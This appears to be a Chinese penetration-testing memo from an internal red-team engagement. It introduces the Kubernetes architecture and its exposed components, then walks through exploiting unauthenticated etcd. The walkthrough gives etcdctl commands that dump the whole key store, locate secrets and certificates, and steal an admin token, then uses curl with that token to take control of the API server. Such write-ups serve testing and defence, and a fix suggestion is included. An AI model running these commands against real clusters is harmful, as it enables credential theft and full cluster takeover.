1
KWs ⼩⽩备忘录
前⾔
简介&&基础知识
暴漏⾯梳理
etcd-未授权访问
kube-apiserver未授权访问
kubelet未授权访问
kWs dashboard认证绕过（CVE-OLNW-NWOTQ）
docker未授权访问
kube-proxy配置错误
参考⽂章
致谢
最近做了⼀个某央企的内部攻防项⽬，在这种项⽬中⼜⼀次深深体会到⾃⼰的菜，加之⾃⼊球以来⼀直
没有发过⽂章，主管都准备踢我出球了，所以特地⽔⼀篇⽂章。
找了找星球还没有k8s之类的⽂章，于是⽔⽂章思想更重。 
之前从来没怎么接触过k8s，但是随着云原⽣以及微服务架构的兴起，云原⽣必定是攻防重点，很多⾯试
也会问k8s的渗透经验。这次侥幸⼊内⽹后也正好发现k8s集群，所以有了⼀个预习的机会，特地写⼀篇
⼩⽩备忘录作为备忘。⼤佬们请轻喷。
k8s全称kubernetes，是为容器服务⽽⽣的⼀个可移植容器的编排管理⼯具，越来越多的公司正在拥抱
k8s，并且当前k8s已经主导了云业务流程，推动了微服务架构等热⻔技术的普及和落地。 
⾸先，我们从容器技术谈起，在容器技术之前，⼤家开发⽤虚拟机⽐较多，⽐如vmware和openstack，
我们可以使⽤虚拟机在我们的操作系统中模拟出多台⼦电脑（Linux），⼦电脑之间是相互隔离的，但是
虚拟机对于开发和运维⼈员⽽⾔，存在启动慢，占⽤空间⼤，不易迁移的缺点。
前⾔
简介&&基础知识 
2
接着，容器化技术应运⽽⽣，它不需要虚拟出整个操作系统，只需要虚拟⼀个⼩规模的环境即可，⽽且
启动速度很快，除了运⾏其中应⽤以外，基本不消耗额外的系统资源。Docker是应⽤最为⼴泛的容器技
术，通过打包镜像，启动容器来创建⼀个服务。但是随着应⽤越来越复杂，容器的数量也越来越多，由
此衍⽣了管理运维容器的重⼤问题，⽽且随着云计算的发展，云端最⼤的挑战，容器在漂移。在此业务
驱动下，k8s问世，提出了⼀套全新的基于容器技术的分布式架构领先⽅案，在整个容器技术领域的发展
是⼀个重⼤突破与创新。
从架构设计层⾯，k8s的可⽤性，伸缩性都可得到很好的解决，如果你想使⽤微服务架构，搭配k8s，真
的是完美，再从部署运维层⾯，服务部署，服务监控，应⽤扩容和故障处理，k8s都提供了很好的解决⽅
案。
具体来说，主要包括以下⼏点：
1. 服务发现与调度
2. 负载均衡
3. 服务⾃愈
4. 服务弹性扩容
5. 横向扩容
6. 存储卷挂载
总⽽⾔之，k8s可以使应⽤的部署和运维更加⽅便。 
最后，我们看下k8s的架构： 
3
k8s集群由Master节点和Node（Worker）节点组成。 
Master节点 
Master节点指的是集群控制节点，管理和控制整个集群，基本上k8s的所有控制命令都发给它，它负责具
体的执⾏过程。在Master上主要运⾏着： 
1. Kubernetes Controller Manager（kube-controller-manager）：k8s中所有资源对象的⾃动化控制
中⼼，维护管理集群的状态，⽐如故障检测，⾃动扩展，滚动更新等。
2. Kubernetes Scheduler（kube-scheduler）： 负责资源调度，按照预定的调度策略将Pod调度到相
应的机器上。
3. etcd：保存整个集群的状态。 
Node节点 
除了master以外的节点被称为Node或者Worker节点，可以在master中使⽤命令 kubectl get nodes查看
集群中的node节点。每个Node都会被Master分配⼀些⼯作负载（Docker容器），当某个Node宕机时，
4
该节点上的⼯作负载就会被Master⾃动转移到其它节点上。在Node上主要运⾏着：
1. kubelet：负责Pod对应的容器的创建、启停等任务，同时与Master密切协作，实现集群管理的基本
功能
2. kube-proxy：实现service的通信与负载均衡 
3. docker（Docker Engine）：Docker引擎，负责本机的容器创建和管理 
⽤户端⼀般通过kubectl命令⾏⼯具与kube-apiserver进⾏交互，当然如果不嫌麻烦也可以直接通过调⽤
kube-apiserver的api来交互。⽤户端命令下发通常流程如下： 
（1）客户端根据⽤户需求，调⽤kube-apiserver相应api（2）kube-apiserver根据命令类型，联动
master节点内的kube-controller-manager和kube-scheduler等组件，通过kubelet进⾏下发新建容器配
置或下发执⾏命令等给到对应node节点（3）node节点与容器进⾏交互完成下发的命令并返回结果（4）
master节点最终根据任务类型将结果持久化存储在etcd中  
k8s集群主要由以下组件组成：（1）kube-apiserver：k8s master节点api服务器，以REST API服务形
式提供接⼝，作为整个k8s的控制⼊⼝。（2）kube-controller-manager：执⾏整个k8s的后台任务，包
括节点状态状况、Pod个数、Pods和Service的关联等。（3）kube-scheduler：接收来⾃kube-
apiserver创建Pods任务，通过收集的集群中所有node节点的资源负载情况分配到某个节点。（4）
etcd：k8s的键值对形式数据库,保存了k8s所有集群数据的后台数据库（5）kube-proxy：运⾏在每个
node节点上，负责pod⽹络代理。定时从etcd获取到service信息来做相应的策略。（6）kubelet：运⾏
在每个node节点上，作为agent，接收分配该节点的pods任务及管理容器，周期性获取容器状态，反馈
给kube-apiserver。 
所以k8s集群主要的暴露⾯其实就是在于上⽂提的⼏个重点组件中 
暴漏⾯梳理
暴露⾯
Plain Text
复制代码
 kube-apiserver
 kubelet
 etcd
 dashboard
 docker
 kube-proxy
1
2
3
4
5
6
5
其中暴露⾯中有4个未授权访问漏洞，分别为kube-apiserver、kubelet、etcd以及docker未授权访问，
⼀个dashboard认证绕过以及⼀个kube-proxy配置错误。 
先对我这次的k8s渗透遇到的漏洞进⾏梳理 
etcd是⼀个⾼可⽤的key-value数据库，它为k8s集群提供底层数据存储。多数情形下，数据库中的内容没有经
过加密处理，⼀旦etcd被⿊客拿下，就意味着整个k8s集群失陷。 
etcd最⼤的安全⻛险是未授权访问。在启动etcd时，如果没有指定 --client-cert-auth 参数打开证书校验，并
且没有通过iptables / 防⽕墙等实施访问控制，etcd的接⼝和数据就会直接暴露给外部⿊客。 
修复建议：通过--client-cert-auth开启证书校验，开启访问控制 
etcd ⼀般监听2379端⼝，对外暴露Client API，可以指定是否启⽤TLS，因此，这个端⼝可能是HTTP服务，也
可能是HTTPS服务。扫描器可以检查2个接⼝，来判断是否存在未授权访问漏洞。第⼀个接⼝是 
https://IP:2379/version， ⻚⾯返回内容类似 
第⼆个接⼝是  https://IP:2379/v2/keys,  ⻚⾯返回内容类似 
还好当时做了⼀个截图，不然很多只能靠⼲述
etcd Client API 有v2和v3两个版本，服务器也可能同时⽀持v2 v3。通过浏览器或curl访问，通常只作简单的验
证，获取少量key的内容。我们可以通过etcdctl来直接dump数据库，在⽂件中快速翻看敏感信息。 
从 https://github.com/etcd-io/etcd/releases/ 下载 得到etcdctl。通过如下命令可以遍历所有的key 
etcd-未授权访问 
遍历keys
Bash
复制代码
ETCDCTL_API=3 ./etcdctl --endpoints=http://IP:2379/ get / --prefix --
keys-only
1
6
如果服务器启⽤了https，需要加上两个参数忽略证书校验 --insecure-transport    --insecure-skip-tls-
verify 
下⾯的命令，通过v3 API来dump数据库到 output.data 
格式是 ⼀⾏key+⼀⾏value， 如下图所示： 
Bash
复制代码
ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-
verify --endpoints=https://IP:2379/ get / --prefix --keys-only
1
Bash
复制代码
ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-
verify --endpoints=https://IP:2379/ get / --prefix --keys-only | sort | 
uniq | xargs -I{} sh -c 'ETCDCTL_API=3 ./etcdctl --insecure-
transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379 
get {} >> output.data && echo "" >> output.data'
1
7
上⼀步我们dump了etcd，下⾯尝试找到api server和所有证书。检索关键字 advertiseAddress 或者 
kubeAPIConﬁg 定位api server的地址： 
在导出的数据中，还可以查找所有证书，检索 BEGIN CERTIFICATE，如图所示，可以发现etcd明⽂存了多个证
书。窃取证书后，未来可能实现⻓期控制该集群。
8
在不dump数据库的情形下，我们也可以直接查找secret相关 key，执⾏如下命令： 
通过 get  /registry/secrets/default/admin-token-557l2 拿到 token。如下图所示： 
使⽤curl访问api server，确认token正确可⽤： 
如果TOKEN错误，将返回401 
查找secret相关keys
Bash
复制代码
ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-
verify --endpoints=https://IP:2379/ get / --prefix --keys-only|sort|uniq| 
grep secret
1
Bash
复制代码
curl --header "Authorization: Bearer TOKEN" -X GET 
https://API_SERVER:6443/api -k
1
9
如果TOKEN正确可⽤，则返回 
执⾏kubectl conﬁg命令，来⽣成简单的临时配置⽂件 
最后，通过该配置⽂件访问api server，达到控制k8s集群的⽬标： 
这样我们就可以完全控制了整个集群
错误返回格式json
JSON
复制代码
{ "kind": "Status", "apiVersion": "v1", "metadata": {
 }, "status": "Failure", "message": "Unauthorized", "reason": 
"Unauthorized", "code": 401}
1
2
JSON
复制代码